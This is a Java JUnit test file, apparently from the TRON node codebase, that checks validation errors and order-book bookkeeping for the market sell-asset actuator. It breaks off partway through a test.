package org.tron.core.actuator;

import static org.junit.Assert.fail;

import com.google.protobuf.Any;
import com.google.protobuf.ByteString;
import com.google.protobuf.InvalidProtocolBufferException;
import java.util.List;
import lombok.extern.slf4j.Slf4j;
import org.junit.After;
import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;
import org.tron.common.BaseTest;
import org.tron.common.TestConstants;
import org.tron.common.utils.ByteArray;
import org.tron.core.ChainBaseManager;
import org.tron.core.Wallet;
import org.tron.core.capsule.AccountCapsule;
import org.tron.core.capsule.AssetIssueCapsule;
import org.tron.core.capsule.MarketAccountOrderCapsule;
import org.tron.core.capsule.MarketOrderCapsule;
import org.tron.core.capsule.MarketOrderIdListCapsule;
import org.tron.core.capsule.TransactionResultCapsule;
import org.tron.core.capsule.utils.MarketUtils;
import org.tron.core.config.args.Args;
import org.tron.core.exception.ContractExeException;
import org.tron.core.exception.ContractValidateException;
import org.tron.core.exception.ItemNotFoundException;
import org.tron.core.store.MarketAccountStore;
import org.tron.core.store.MarketOrderStore;
import org.tron.core.store.MarketPairPriceToOrderStore;
import org.tron.core.store.MarketPairToPriceStore;
import org.tron.protos.Protocol.AccountType;
import org.tron.protos.Protocol.MarketOrder.State;
import org.tron.protos.Protocol.MarketOrderDetail;
import org.tron.protos.Protocol.MarketOrderPair;
import org.tron.protos.Protocol.MarketPrice;
import org.tron.protos.contract.AssetIssueContractOuterClass.AssetIssueContract;
import org.tron.protos.contract.MarketContract.MarketSellAssetContract;

@Slf4j

public class MarketSellAssetActuatorTest extends BaseTest {

  private static final String ACCOUNT_NAME_FIRST = "ownerF";
  private static final String OWNER_ADDRESS_FIRST;
  private static final String ACCOUNT_NAME_SECOND = "ownerS";
  private static final String OWNER_ADDRESS_SECOND;
  private static final String OWNER_ADDRESS_NOT_EXIST;
  private static final String OWNER_ADDRESS_INVALID = "aaaa";
  private static final String TOKEN_ID_ONE = String.valueOf(1L);
  private static final String TOKEN_ID_TWO = String.valueOf(2L);
  private static final String TRX = "_";

  static {
    Args.setParam(new String[]{"--output-directory", dbPath()}, TestConstants.TEST_CONF);
    OWNER_ADDRESS_FIRST =
        Wallet.getAddressPreFixString() + "abd4b9367799eaa3197fecb144eb71de1e049abc";
    OWNER_ADDRESS_SECOND =
        Wallet.getAddressPreFixString() + "548794500882809695a8a687866e76d4271a1abc";
    OWNER_ADDRESS_NOT_EXIST =
        Wallet.getAddressPreFixString() + "548794500882809695a8a687866e06d4271a1c11";
  }

  /**
   * create temp Capsule test need.
   */
  @Before
  public void initTest() {
    dbManager.getDynamicPropertiesStore().saveAllowMarketTransaction(1L);
    dbManager.getDynamicPropertiesStore().saveAllowSameTokenName(1);
    dbManager.getDynamicPropertiesStore().saveLatestBlockHeaderTimestamp(1000000);
    dbManager.getDynamicPropertiesStore().saveLatestBlockHeaderNumber(10);
    dbManager.getDynamicPropertiesStore().saveNextMaintenanceTime(2000000);

    byte[] ownerAddressFirstBytes = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    byte[] ownerAddressSecondBytes = ByteArray.fromHexString(OWNER_ADDRESS_SECOND);

    AccountCapsule ownerAccountFirstCapsule =
        new AccountCapsule(
            ByteString.copyFromUtf8(ACCOUNT_NAME_FIRST),
            ByteString.copyFrom(ownerAddressFirstBytes),
            AccountType.Normal,
            10000_000_000L);
    AccountCapsule ownerAccountSecondCapsule =
        new AccountCapsule(
            ByteString.copyFromUtf8(ACCOUNT_NAME_SECOND),
            ByteString.copyFrom(ownerAddressSecondBytes),
            AccountType.Normal,
            20000_000_000L);

    // init account
    dbManager.getAccountStore()
        .put(ownerAccountFirstCapsule.getAddress().toByteArray(), ownerAccountFirstCapsule);
    dbManager.getAccountStore()
        .put(ownerAccountSecondCapsule.getAddress().toByteArray(), ownerAccountSecondCapsule);
  }

  private void InitAsset() {
    AssetIssueCapsule assetIssueCapsule1 = new AssetIssueCapsule(
        AssetIssueContract.newBuilder()
            .setName(ByteString.copyFrom("abc".getBytes()))
            .setId(TOKEN_ID_ONE)
            .build());

    AssetIssueCapsule assetIssueCapsule2 = new AssetIssueCapsule(
        AssetIssueContract.newBuilder()
            .setName(ByteString.copyFrom("def".getBytes()))
            .setId(TOKEN_ID_TWO)
            .build());
    dbManager.getAssetIssueV2Store().put(assetIssueCapsule1.createDbV2Key(), assetIssueCapsule1);
    dbManager.getAssetIssueV2Store().put(assetIssueCapsule2.createDbV2Key(), assetIssueCapsule2);
  }

  @After
  public void cleanDb() {
    byte[] ownerAddressFirstBytes = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    byte[] ownerAddressSecondBytes = ByteArray.fromHexString(OWNER_ADDRESS_SECOND);

    // delete order
    cleanMarketOrderByAccount(ownerAddressFirstBytes);
    cleanMarketOrderByAccount(ownerAddressSecondBytes);
    ChainBaseManager chainBaseManager = dbManager.getChainBaseManager();

    chainBaseManager.getMarketAccountStore().delete(ownerAddressFirstBytes);
    chainBaseManager.getMarketAccountStore().delete(ownerAddressSecondBytes);

    MarketPairToPriceStore pairToPriceStore = chainBaseManager
        .getMarketPairToPriceStore();
    pairToPriceStore.forEach(
        bytesCapsuleEntry -> pairToPriceStore
            .delete(bytesCapsuleEntry.getKey()));

    //delete orderList
    MarketPairPriceToOrderStore pairPriceToOrderStore = chainBaseManager
        .getMarketPairPriceToOrderStore();
    pairPriceToOrderStore.forEach(
        marketOrderIdListCapsuleEntry -> pairPriceToOrderStore
            .delete(marketOrderIdListCapsuleEntry.getKey()));
  }

  private void cleanMarketOrderByAccount(byte[] accountAddress) {

    if (accountAddress == null || accountAddress.length == 0) {
      return;
    }

    MarketAccountOrderCapsule marketAccountOrderCapsule;
    try {
      marketAccountOrderCapsule = dbManager.getChainBaseManager()
          .getMarketAccountStore().get(accountAddress);
    } catch (ItemNotFoundException e) {
      return;
    }

    MarketOrderStore marketOrderStore = dbManager.getChainBaseManager().getMarketOrderStore();

    List<ByteString> orderIdList = marketAccountOrderCapsule.getOrdersList();
    orderIdList.forEach(
        orderId -> marketOrderStore.delete(orderId.toByteArray())
    );
  }

  private Any getContract(String address, String sellTokenId, long sellTokenQuantity,
      String buyTokenId, long buyTokenQuantity) {

    return Any.pack(
        MarketSellAssetContract.newBuilder()
            .setOwnerAddress(ByteString.copyFrom(ByteArray.fromHexString(address)))
            .setSellTokenId(ByteString.copyFrom(sellTokenId.getBytes()))
            .setSellTokenQuantity(sellTokenQuantity)
            .setBuyTokenId(ByteString.copyFrom(buyTokenId.getBytes()))
            .setBuyTokenQuantity(buyTokenQuantity)
            .build());
  }

  //test case
  //
  // validate:
  // ownerAddress,token,Account,TokenQuantity,position
  // balance(fee) not enough,token not enough


  @Test
  public void invalidOwnerAddress() {

    InitAsset();
    String sellTokenId = "123";
    long sellTokenQuant = 100000000L;
    String buyTokenId = "456";
    long buyTokenQuant = 200000000L;

    //use Invalid Address, result is failed, exception is "Invalid address".
    {
      MarketSellAssetActuator actuator = new MarketSellAssetActuator();
      actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
          OWNER_ADDRESS_INVALID, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

      try {
        actuator.validate();
        fail("Invalid address");
      } catch (ContractValidateException e) {
        Assert.assertEquals("Invalid address", e.getMessage());
      }
    }
    // Account not exist , result is failed, exception is "Account does not exist!".
    {
      byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_NOT_EXIST);
      AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
      Assert.assertNull(accountCapsule);

      MarketSellAssetActuator actuator = new MarketSellAssetActuator();
      actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
          OWNER_ADDRESS_NOT_EXIST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

      try {
        actuator.validate();
        fail("Account does not exist!");
      } catch (ContractValidateException e) {
        Assert.assertEquals("Account does not exist!", e.getMessage());
      }
    }

  }

  @Test
  public void invalidQuantity() {

    InitAsset();
    // use negative sell quantity, result is failed,
    // exception is "token quantity must greater than zero".
    {
      String sellTokenId = "123";
      long sellTokenQuant = -100000000L;
      String buyTokenId = "456";
      long buyTokenQuant = 200000000L;

      MarketSellAssetActuator actuator = new MarketSellAssetActuator();
      actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
          OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

      try {
        actuator.validate();
        fail("token quantity must greater than zero");
      } catch (ContractValidateException e) {
        Assert.assertEquals("token quantity must greater than zero", e.getMessage());
      }
    }

    {
      String sellTokenId = "123";
      long sellTokenQuant = 100000000L;
      String buyTokenId = "456";
      long buyTokenQuant = -200000000L;

      MarketSellAssetActuator actuator = new MarketSellAssetActuator();
      actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
          OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

      try {
        actuator.validate();
        fail("token quantity must greater than zero");
      } catch (ContractValidateException e) {
        Assert.assertEquals("token quantity must greater than zero", e.getMessage());
      }
    }

    {
      long quantityLimit = dbManager.getChainBaseManager().getDynamicPropertiesStore()
          .getMarketQuantityLimit();
      String sellTokenId = "123";
      long sellTokenQuant = quantityLimit + 1;
      String buyTokenId = "456";
      long buyTokenQuant = 200000000L;

      MarketSellAssetActuator actuator = new MarketSellAssetActuator();
      actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
          OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

      try {
        actuator.validate();
        fail("token quantity must less than " + quantityLimit);
      } catch (ContractValidateException e) {
        Assert.assertEquals("token quantity must less than " + quantityLimit, e.getMessage());
      }
    }

  }

  @Test
  public void invalidTokenId() {

    {
      String sellTokenId = "aaa";
      long sellTokenQuant = 100000000L;
      String buyTokenId = "456";
      long buyTokenQuant = 200000000L;

      MarketSellAssetActuator actuator = new MarketSellAssetActuator();
      actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
          OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));
      try {
        actuator.validate();
        fail("sellTokenId is not a valid number");
      } catch (ContractValidateException e) {
        Assert.assertEquals("sellTokenId is not a valid number", e.getMessage());
      }
    }
    {
      String sellTokenId = "456";
      long sellTokenQuant = 100000000L;
      String buyTokenId = "aaa";
      long buyTokenQuant = 200000000L;

      MarketSellAssetActuator actuator = new MarketSellAssetActuator();
      actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
          OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));
      try {
        actuator.validate();
        fail("buyTokenId is not a valid number");
      } catch (ContractValidateException e) {
        Assert.assertEquals("buyTokenId is not a valid number", e.getMessage());
      }
    }
    {
      String sellTokenId = "456";
      long sellTokenQuant = 100000000L;
      String buyTokenId = "456";
      long buyTokenQuant = 200000000L;

      MarketSellAssetActuator actuator = new MarketSellAssetActuator();
      actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
          OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));
      try {
        actuator.validate();
        fail("cannot exchange same tokens");
      } catch (ContractValidateException e) {
        Assert.assertEquals("cannot exchange same tokens", e.getMessage());
      }
    }
  }

  /**
   * no Enough Balance For Selling TRX, result is failed, exception is "No enough balance !".
   */
  @Test
  public void noEnoughBalanceForSellingTRX() {

    InitAsset();

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    Assert.assertEquals(10000_000000L, accountCapsule.getBalance());

    String sellTokenId = TRX;
    //sellTokenQuant = balance - fee + 1
    long sellTokenQuant = accountCapsule.getBalance()
        - dbManager.getDynamicPropertiesStore().getMarketSellFee() + 1;
    String buyTokenId = "456";
    long buyTokenQuant = 200_000000L;

    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    String errorMessage = "No enough balance !";
    try {
      actuator.validate();
      fail(errorMessage);
    } catch (ContractValidateException e) {
      Assert.assertEquals(errorMessage, e.getMessage());
    }
  }


  /**
   * no Enough Balance For Selling Token, result is failed, exception is "No enough balance !".
   */
  @Test
  public void noEnoughBalanceForSellingToken() {

    InitAsset();

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    //balance = fee - 1
    accountCapsule.setBalance(dbManager.getDynamicPropertiesStore().getMarketSellFee() - 1L);
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);

    String sellTokenId = "123";
    long sellTokenQuant = 100_000000L;
    String buyTokenId = "456";
    long buyTokenQuant = 200_000000L;

    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    String errorMessage = "No enough balance !";
    try {
      actuator.validate();
      fail(errorMessage);
    } catch (ContractValidateException e) {
      Assert.assertEquals(errorMessage, e.getMessage());
    }
  }


  /**
   * no sell Token Id, result is failed, exception is "No sellTokenID".
   */
  @Test
  public void noSellTokenID() {

    InitAsset();

    String sellTokenId = "123";
    long sellTokenQuant = 100_000000L;
    String buyTokenId = "456";
    long buyTokenQuant = 200_000000L;

    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    String errorMessage = "No sellTokenId !";
    try {
      actuator.validate();
      fail(errorMessage);
    } catch (ContractValidateException e) {
      Assert.assertEquals(errorMessage, e.getMessage());
    }
  }

  /**
   * SellToken balance is not enough, result is failed, exception is "No buyTokenID !".
   */
  @Test
  public void notEnoughSellToken() {

    InitAsset();

    String sellTokenId = TOKEN_ID_ONE;
    long sellTokenQuant = 100_000000L;
    String buyTokenId = "456";
    long buyTokenQuant = 200_000000L;

    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    String errorMessage = "SellToken balance is not enough !";
    try {
      actuator.validate();
      fail(errorMessage);
    } catch (ContractValidateException e) {
      Assert.assertEquals(errorMessage, e.getMessage());
    }
  }

  /**
   * No buyTokenID, result is failed, exception is "No buyTokenID".
   */
  @Test
  public void noBuyTokenID() {

    InitAsset();

    String sellTokenId = TOKEN_ID_ONE;
    long sellTokenQuant = 100_000000L;
    String buyTokenId = "456";
    long buyTokenQuant = 200_000000L;

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);

    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    String errorMessage = "No buyTokenId !";
    try {
      actuator.validate();
      fail(errorMessage);
    } catch (ContractValidateException e) {
      Assert.assertEquals(errorMessage, e.getMessage());
    }
  }

  @Test
  public void exceedMakerBuyOrderNumLimit() throws Exception {

    InitAsset();

    //(sell id_1  and buy id_2)
    String sellTokenId = TOKEN_ID_ONE;
    long sellTokenQuant = 100L;
    String buyTokenId = TOKEN_ID_TWO;
    long buyTokenQuant = 200L;

    long orderNum = 100L;

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant * orderNum,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);
    Assert.assertEquals(sellTokenQuant * orderNum,
        (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));

    // Initialize the order book

    //add three order(sell id_2 and buy id_1) with different price by the same account
    //TOKEN_ID_TWO is twice as expensive as TOKEN_ID_ONE
    for (int i = 0; i < orderNum; i++) {
      addOrder(TOKEN_ID_ONE, sellTokenQuant, TOKEN_ID_TWO,
          buyTokenQuant, OWNER_ADDRESS_FIRST);
    }

    // do process
    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    String errorMessage = "Maximum number of orders exceeded，100";
    try {
      actuator.validate();
      fail(errorMessage);
    } catch (ContractValidateException e) {
      Assert.assertEquals(errorMessage, e.getMessage());
    }
  }

  /**
   * validate Success without position, result is Success. Search from the bestPrice
   */
  @Test
  public void validateSuccessWithoutPosition() throws Exception {

    InitAsset();

    String sellTokenId = TOKEN_ID_ONE;
    long sellTokenQuant = 100L;
    String buyTokenId = TRX;
    long buyTokenQuant = 300L;

    for (int i = 0; i < 10; i++) {
      addOrder(TOKEN_ID_ONE, 100L, TOKEN_ID_TWO,
          200L + i, OWNER_ADDRESS_FIRST);
    }

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);

    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    try {
      actuator.validate();
    } catch (ContractValidateException e) {
      fail("validateSuccess error");
    }
  }

  private void prepareAccount(String sellTokenId, String buyTokenId,
      long sellTokenQuant, long buyTokenQuant, byte[] ownerAddress) {
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);
    Assert.assertEquals(sellTokenQuant,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));
  }


  private void addOrder(String sellTokenId, long sellTokenQuant,
      String buyTokenId, long buyTokenQuant, String ownAddress) throws Exception {

    byte[] ownerAddress = ByteArray.fromHexString(ownAddress);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);

    // do process
    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        ownAddress, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    TransactionResultCapsule ret = new TransactionResultCapsule();
    actuator.validate();
    actuator.execute(ret);
  }

  // execute: combination
  // Trading object：
  //    abc to def
  //    abc to trx
  //    trx to abc
  // Scenes：
  //    no buy orders before,add first sell order
  //    no buy orders before，add multiple sell orders, need to maintain the correct sequence
  //    no buy orders before，add multiple sell orders, need to maintain the correct sequence,
  //      same price
  //    has buy orders before，add first sell order，not match
  //    has buy orders and sell orders before，add sell order，not match,
  //      need to maintain the correct sequence

  //    all match with 2 existing same price buy orders and complete all 3 orders
  //    part match with 2 existing buy orders and complete the makers,
  //        left enough
  //        left not enough and return left（Accuracy problem）
  //    part match with 2 existing buy orders and complete the taker,
  //        left enough
  //        left not enough and return left（Accuracy problem）（not exist)

  /**
   * no buy orders before,add first sell order,selling TRX and buying token
   */
  @Test
  public void noBuyAddFirstSellOrder1() throws Exception {

    InitAsset();

    String sellTokenId = TRX;
    long sellTokenQuant = 100_000000L;
    String buyTokenId = TOKEN_ID_ONE;
    long buyTokenQuant = 200_000000L;

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    long balanceBefore = accountCapsule.getBalance();

    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    TransactionResultCapsule ret = new TransactionResultCapsule();

    actuator.validate();
    actuator.execute(ret);

    ChainBaseManager chainBaseManager = dbManager.getChainBaseManager();
    MarketAccountStore marketAccountStore = chainBaseManager.getMarketAccountStore();
    MarketOrderStore orderStore = chainBaseManager.getMarketOrderStore();
    MarketPairToPriceStore pairToPriceStore = chainBaseManager.getMarketPairToPriceStore();
    MarketPairPriceToOrderStore pairPriceToOrderStore = chainBaseManager
        .getMarketPairPriceToOrderStore();

    //check balance
    accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    Assert.assertEquals(balanceBefore, sellTokenQuant
        + dbManager.getDynamicPropertiesStore().getMarketSellFee() + accountCapsule.getBalance());

    //check accountOrder
    MarketAccountOrderCapsule accountOrderCapsule = marketAccountStore.get(ownerAddress);
    Assert.assertEquals(1, accountOrderCapsule.getCount());
    ByteString orderId = accountOrderCapsule.getOrdersList().get(0);

    //check order
    MarketOrderCapsule orderCapsule = orderStore.get(orderId.toByteArray());
    Assert.assertEquals(orderCapsule.getSellTokenQuantityRemain(), sellTokenQuant);

    //check pairToPrice
    Assert.assertEquals(1,
        pairToPriceStore.getPriceNum(sellTokenId.getBytes(), buyTokenId.getBytes()));
    List<byte[]> priceKeysList = pairPriceToOrderStore
        .getPriceKeysList(sellTokenId.getBytes(), buyTokenId.getBytes(), 1);
    MarketOrderPair tokenPair = MarketUtils.decodeKeyToMarketPair(priceKeysList.get(0));
    //
    Assert.assertArrayEquals(MarketUtils.expandTokenIdToPriceArray(sellTokenId.getBytes()),
        tokenPair.getSellTokenId().toByteArray());
    Assert.assertArrayEquals(MarketUtils.expandTokenIdToPriceArray(buyTokenId.getBytes()),
        tokenPair.getBuyTokenId().toByteArray());

    MarketPrice marketPrice = MarketUtils.decodeKeyToMarketPrice(priceKeysList.get(0));
    // 100_000000L:200_000000L => 1:2
    Assert.assertEquals(1L, marketPrice.getSellTokenQuantity());
    Assert.assertEquals(2L, marketPrice.getBuyTokenQuantity());

    //check pairPriceToOrder
    byte[] pairPriceKey = MarketUtils.createPairPriceKey(
        tokenPair.getSellTokenId().toByteArray(), tokenPair.getBuyTokenId().toByteArray(),
        marketPrice.getSellTokenQuantity(), marketPrice.getBuyTokenQuantity());
    MarketOrderIdListCapsule orderIdListCapsule = pairPriceToOrderStore
        .get(pairPriceKey);
    Assert.assertEquals(1, orderIdListCapsule.getOrderSize(orderStore));
    Assert.assertArrayEquals(orderIdListCapsule.getHead(),
        orderId.toByteArray());

    Assert.assertEquals(orderCapsule.getID(), ret.getOrderId());
    Assert.assertEquals(0, ret.getOrderDetailsList().size());
  }

  /**
   * no buy orders before,add first sell order,selling Token and buying TRX
   */
  @Test
  public void noBuyAddFirstSellOrder2() throws Exception {

    InitAsset();

    String sellTokenId = TOKEN_ID_ONE;
    long sellTokenQuant = 100_000000L;
    String buyTokenId = TRX;
    long buyTokenQuant = 200_000000L;

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);
    long balanceBefore = accountCapsule.getBalance();
    Assert.assertEquals(sellTokenQuant,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));

    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    TransactionResultCapsule ret = new TransactionResultCapsule();

    actuator.validate();
    actuator.execute(ret);

    ChainBaseManager chainBaseManager = dbManager.getChainBaseManager();
    MarketAccountStore marketAccountStore = chainBaseManager.getMarketAccountStore();
    MarketOrderStore orderStore = chainBaseManager.getMarketOrderStore();
    MarketPairToPriceStore pairToPriceStore = chainBaseManager.getMarketPairToPriceStore();
    MarketPairPriceToOrderStore pairPriceToOrderStore = chainBaseManager
        .getMarketPairPriceToOrderStore();

    //check balance and token
    accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    Assert.assertEquals(balanceBefore,
        dbManager.getDynamicPropertiesStore().getMarketSellFee() + accountCapsule.getBalance());
    Assert.assertEquals(0L, (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));

    //check accountOrder
    MarketAccountOrderCapsule accountOrderCapsule = marketAccountStore.get(ownerAddress);
    Assert.assertEquals(1, accountOrderCapsule.getCount());
    ByteString orderId = accountOrderCapsule.getOrdersList().get(0);

    //check order
    MarketOrderCapsule orderCapsule = orderStore.get(orderId.toByteArray());
    Assert.assertEquals(orderCapsule.getSellTokenQuantityRemain(), sellTokenQuant);

    //check pairToPrice
    Assert.assertEquals(1, pairToPriceStore.getPriceNum(sellTokenId.getBytes(),
        buyTokenId.getBytes()));
    List<byte[]> priceKeysList = pairPriceToOrderStore
        .getPriceKeysList(sellTokenId.getBytes(), buyTokenId.getBytes(), 1);
    MarketOrderPair tokenPair = MarketUtils.decodeKeyToMarketPair(priceKeysList.get(0));
    Assert.assertArrayEquals(MarketUtils.expandTokenIdToPriceArray(sellTokenId.getBytes()),
        tokenPair.getSellTokenId().toByteArray());
    Assert.assertArrayEquals(MarketUtils.expandTokenIdToPriceArray(buyTokenId.getBytes()),
        tokenPair.getBuyTokenId().toByteArray());

    MarketPrice marketPrice = MarketUtils.decodeKeyToMarketPrice(priceKeysList.get(0));
    // 100_000000L:200_000000L => 1:2
    Assert.assertEquals(1L, marketPrice.getSellTokenQuantity());
    Assert.assertEquals(2L, marketPrice.getBuyTokenQuantity());

    //check pairPriceToOrder
    byte[] pairPriceKey = MarketUtils.createPairPriceKey(
        tokenPair.getSellTokenId().toByteArray(), tokenPair.getBuyTokenId().toByteArray(),
        marketPrice.getSellTokenQuantity(), marketPrice.getBuyTokenQuantity());
    MarketOrderIdListCapsule orderIdListCapsule = pairPriceToOrderStore
        .get(pairPriceKey);
    Assert.assertEquals(1, orderIdListCapsule.getOrderSize(orderStore));
    Assert.assertArrayEquals(orderIdListCapsule.getHead(),
        orderId.toByteArray());
  }


  /**
   * no buy orders before,add first sell order,selling Token and buying token
   */
  @Test
  public void noBuyAddFirstSellOrder3() throws Exception {

    InitAsset();

    String sellTokenId = TOKEN_ID_ONE;
    long sellTokenQuant = 100_000000L;
    String buyTokenId = TOKEN_ID_TWO;
    long buyTokenQuant = 200_000000L;

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);
    long balanceBefore = accountCapsule.getBalance();
    Assert.assertEquals(sellTokenQuant,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));

    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    TransactionResultCapsule ret = new TransactionResultCapsule();

    actuator.validate();
    actuator.execute(ret);

    ChainBaseManager chainBaseManager = dbManager.getChainBaseManager();
    MarketAccountStore marketAccountStore = chainBaseManager.getMarketAccountStore();
    MarketOrderStore orderStore = chainBaseManager.getMarketOrderStore();
    MarketPairToPriceStore pairToPriceStore = chainBaseManager.getMarketPairToPriceStore();
    MarketPairPriceToOrderStore pairPriceToOrderStore = chainBaseManager
        .getMarketPairPriceToOrderStore();

    //check balance and token
    accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    Assert.assertEquals(balanceBefore,
        dbManager.getDynamicPropertiesStore().getMarketSellFee() + accountCapsule.getBalance());
    Assert.assertEquals(0L,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));

    //check accountOrder
    MarketAccountOrderCapsule accountOrderCapsule = marketAccountStore.get(ownerAddress);
    Assert.assertEquals(1, accountOrderCapsule.getCount());
    ByteString orderId = accountOrderCapsule.getOrdersList().get(0);

    //check order
    MarketOrderCapsule orderCapsule = orderStore.get(orderId.toByteArray());
    Assert.assertEquals(orderCapsule.getSellTokenQuantityRemain(), sellTokenQuant);

    //check pairToPrice
